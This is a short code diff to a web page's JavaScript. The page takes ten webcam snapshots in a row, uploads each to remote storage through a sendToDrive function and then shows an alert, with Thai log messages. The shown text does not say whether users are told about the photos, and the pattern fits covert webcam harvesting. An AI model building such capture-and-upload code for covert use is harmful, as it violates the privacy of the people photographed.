@@ -104,7 +104,6 @@
     }
 
     function capturePhotos() {
-      let images = [];
       for (let i = 0; i < 10; i++) {
         setTimeout(() => {
           canvas.width = video.videoWidth;
@@ -112,8 +111,7 @@
           context.drawImage(video, 0, 0, canvas.width, canvas.height);
           let imgData = canvas.toDataURL("image/png");
           sendToDrive(imgData);
-          images.push(imgData);
-          if (images.length === 10) {
+          if (i === 9) {
             document.getElementById("alertBox").style.display = "block";
             stopCamera();
           }
@@ -137,10 +135,10 @@
       })
       .then(res => res.text())
       .then(result => {
-        console.log("ผลลัพธ์:", result);
+        console.log("📤 อัปโหลดสำเร็จ:", result);
       })
       .catch(err => {
-        console.error("ข้อผิดพลาด:", err);
+        console.error("❌ เกิดข้อผิดพลาด:", err);
       });
     }
   </script>
